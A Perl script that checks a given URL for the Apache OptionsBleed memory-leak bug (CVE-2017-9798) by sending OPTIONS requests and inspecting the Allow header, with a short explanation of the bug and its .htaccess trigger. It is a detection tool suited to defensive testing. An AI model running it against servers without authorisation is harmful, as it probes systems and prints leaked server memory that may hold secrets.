#!/usr/bin/perl

use 5.10.0;
            
use strict;
use warnings;
            
no warnings 'experimental';

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;

my $ua = LWP::UserAgent->new();
my $url = 0;

$url = $ARGV[0] or die("Usage : perl $0 <url>\n\n");

header();
checkOptionsBleed($ua, $url); 
    
sub header {
    
    print "\n\n\t\t===[ Apache CVE-2017-9798 AKA OptionsBleed ]===\n"; 
    print "\n\n";
    print "\n" . "-"x80 . "\n\n";    
    print qq{
  Optionsbleed is a use after free error in Apache HTTP that causes a corrupted
  Allow header to be constructed in response to HTTP OPTIONS requests. 
  This can leak pieces of arbitrary memory from the server process that may
  contain secrets.
            
  The memory pieces change after multiple requests, so for a vulnerable
  host an arbitrary number of memory chunks can be leaked.
        
  The bug appears if a webmaster tries to use the
  "Limit" directive with an invalid HTTP method.
        
  Example .htaccess:
        
   <Limit abcxyz>
   </Limit>
     };
     print "\n" . "-"x80 . "\n\n";
}

sub checkOptionsBleed {
    my ( $ua, $url ) = @_;
    my $method = 0;
    my $request = 0;
    my $response = 0;
    
    my @requests = ();
    
    #my @headers = ('Allow', 'Public');
    my @headers = ('Allow');
    my @responses = ();
    
    # Build/send the requests and get the answers
    $request = new HTTP::Request 'OPTIONS', $url;
    push(@responses, $ua->request($request));
    
    $request = new HTTP::Request 'OPTIONS *', $url;
    push(@responses, $ua->request($request));

    foreach my $response (@responses) {
        foreach my $header (@headers) {
            # Check if we got methods from the allow header, however we check with the methods list to find allowed methods
            if($response->is_success) {
                if($response->header($header)) {
                    print "[RESPONSE] Method : " . $response->request->method . "\n\t[HEADER] Received $header Header : " . $response->header($header) . "\n\n";
                    testBleed($response->header($header));
                } else {
		    print "[RESPONSE] Method : " . $response->request->method . "\n\t[HEADER] Anay $header Header Received ...\n";
                }
            } else {
		print "[RESPONSE] Method : " . $response->request->method . "\n\t[FAILED] Method Not Allowed (" . $response->code . ")\n\n";
            }
        }
        
    }
}

sub testBleed {
    my ( $header_value ) = @_;
    my $vulnerable = 0;

    given($header_value)
    {
        when(/^[a-zA-Z\-]*\s?,\s?[a-zA-Z\-]+[\s,]*([,]*\s?[a-zA-Z\-]*\s?(?:,\s?[a-zA-Z\-]+[\s,]*)?)+$/) {
            print "[-] OptionsBleed : NOT VULNERABLE\n\tThe Methods Are Separated With Commas : $header_value\n\n";
        }
        
        when(/^([a-zA-Z\-]+\s?(?:\s[\s]*[a-zA-Z\-]+))+$/) {
            print "[-] OptionsBleed : NOT VULNERABLE\n\tThe Methods Are Separated With Spaces : $header_value\n\n";
        }
        
        default {
            if($header_value) {
                print "[+] OptionsBleed : VULNERABLE\n\tThe Methods Are Separated With Exotic Sperators : $header_value\n\n";
                $vulnerable = 1;
            } else {
                print "[!] OptionsBleed : NOT VULNERABLE : Empty Header ...\n\n";
            }
        }
    }
    
    return $vulnerable;
}
